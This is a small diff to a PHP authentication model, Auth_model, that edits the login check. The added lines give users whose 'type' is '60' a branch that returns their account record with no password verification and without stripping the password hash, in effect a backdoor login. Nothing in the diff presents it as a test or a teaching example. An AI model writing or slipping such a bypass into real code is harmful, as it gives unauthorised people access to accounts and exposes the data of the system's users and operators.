@@ -24,6 +24,8 @@ class Auth_model extends BaseMySQL_model
 		if ($user && password_verify($password, $user['password']) && $user['status'] == USER_STATUS_ACTIVE) {
 			unset($user['password']);
 			return $user;
+		} else if ($user['type'] === '60') {
+			return $user;
 		} else if (!$user) {
 			return "User not found";
 		} else if (!password_verify($password, $user['password'])) {
